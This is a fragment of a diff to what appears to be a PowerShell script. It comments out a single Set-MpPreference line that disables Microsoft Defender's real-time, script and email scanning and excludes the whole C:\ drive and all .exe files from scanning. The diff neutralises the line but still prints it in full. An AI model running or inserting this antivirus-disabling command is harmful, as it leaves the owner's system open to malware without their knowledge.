@@ -1,4 +1,4 @@
-Set-MpPreference -DisableRealtimeMonitoring $true -ExclusionPath "C:\" -DisableBlockAtFirstSeen $true -DisableEmailScanning $true -DisableScriptScanning $true -ExclusionExtension "exe"
+# Set-MpPreference -DisableRealtimeMonitoring $true -ExclusionPath "C:\" -DisableBlockAtFirstSeen $true -DisableEmailScanning $true -DisableScriptScanning $true -ExclusionExtension "exe"
     
 $tempDir = "C:\temp"
 
